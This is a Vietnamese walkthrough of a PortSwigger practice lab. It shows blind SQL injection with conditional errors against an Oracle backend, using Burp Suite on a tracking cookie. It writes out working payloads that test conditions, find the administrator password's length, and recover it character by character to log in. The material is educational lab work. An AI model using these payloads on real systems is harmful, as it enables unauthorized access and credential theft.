# Lab: Blind SQL injection with conditional errors

### Link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
![Require of Lab](/Images/sql12.1.png)

Yêu cầu của bài lab là đăng nhập bằng thông tin của user `administrator`

Đầu tiên mở Burp Suite, chuyển sang tab `Proxy` > `Intercept` > `Open Browser`. Truy cập vào bài lab bằng trình duyệt của Burp Suite

Vào bài lab ta thấy đây là 1 website bán hàng, với từng danh mục như `Corporate gifts`, `Food & Drink`, `Gifts` và `Lifestyle`, `Pets`....
![Website](/Images/sql12.2.png)

Sau đó, bấm vào một danh mục tùy ý 
![Website](/Images/sql12.4.png)

và ở Burp chọn tab `HTTP history`, lựa chọn request mới nhất, tiếp theo click chuột phải vô request đó và chọn `Send to Repeater`
![Website](/Images/sql12.5.png)

Chuyển sang tab `Repeater`, ta có thể thấy được TrackingId của request là `O4sZnplqWKgPqmMZ`.
Chỉnh sửa TrackingId thành
> TrackingId = O4sZnplqWKgPqmMZ`'`

bấm `Send` để gửi request và xem phản hồi
![Website](/Images/sql12.5.png)

Tiếp tục chỉnh sửa TrackingId thành
> TrackingId= O4sZnplqWKgPqmMZ`''`

bấm `Send` để gửi request và xem phản hồi
![Website](/Images/sql12.6.png)

Tạo một câu truy vấn con hợp lệ, như sau 
> TrackingId'|| (SELECT' ' FROM dual) ||'

Do sử dụng CSLD là Oracle, nên khi sử dụng câu truy vấn Select phải chỉ định một tên bảng.
![Website](/Images/sql12.7.png)

Tiếp theo là tạo một truy vấn không hợp lệ và xem phản hồi
>  TrackingId'|| (SELECT' ' FROM abc) ||'

![Website](/Images/sql12.8.png)

Bởi vì trong dtb không có bảng nào là abc nên truy vấn không hợp lệ, và phản hồi trả về một lỗi. 
Hành vi này thực sự gợi ý rằng nội dung đã chèn đang được xử lý như một truy vấn SQL bởi back-end.

Kiểm tra xem bảng user có trong database hay không, ta sẽ kiểm tra như sau
Thay đổi TrackingId thành như sau
>  TrackingId`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`

Vì khi phản hồi không trả về lỗi, nên có thể suy đoán rằng bảng user có tồn tại trong dtb
![Website](/Images/sql12.9.png)

Kiểm tra phản hồi, khi chèn một câu truy vấn điều kiện vào như sau
> TrackingId`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

![Website](/Images/sql12.10.png)

Thay đổi câu truy vấn trở thành như sau và xem phản hồi
> TrackingId`'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

![Website](/Images/sql12.11.png)

Qua hai phép thử trên, nhận thấy rằng ta có thể kích hoạt lỗi một cách có điều kiện dựa trên một điều kiện cụ thể.
Câu lệnh CASE kiểm tra một điều kiện và đánh giá một biểu thức nếu điều kiện là đúng và một biểu thức khác nếu điều kiện là sai.
Nếu điều kiện đúng (điều kiện 1=1 hoặc 1=2) thì ta sẽ thực hiện biểu thức đầu tiên (một số chia cho 0 -> gây ra lỗi) và ngược lại,
điều kiện sai thì t sẽ thực hiện biểu thức thứ hai

Để tìm ra password của administrator, đầu tiên ta phải tìm được độ dài của password bằng cách sử dụng Burp Intruder
> TrackingId`'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Nếu điều kiện LENGTH(password)> [số] thì sẽ trả về lỗi, ngược lại thì sẽ không có lỗi. Do đó, ta chỉ cần dò xem phản hồi của payload nào không trả về lỗi là xác định được độ dài của password
![Website](/Images/sql12.12.png)

Ta đã xác định được độ dài của password là 20 ký tự, tiếp đó sẽ đi tấn công brute forcer để tìm ra password
> TrackingId`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Dựa vào kết quả tấn công, ta tìm được password là `sb6gpzsug7u3fswegxb6`
![Website](/Images/sql12.13.png)

Sau đó, dùng password đã tìm được thực hiện đăng nhập vào website bằng username `administrator` là đã hoàn thành bài lab rồi
![Website](/Images/sql12.14.png)


***********
Từng bước làm cụ thể được hướng dẫn ở bài lab trước :

Link: 
***********
<div align="right"> <i> Ngày 23 tháng 01 năm 2022 </i> </div>



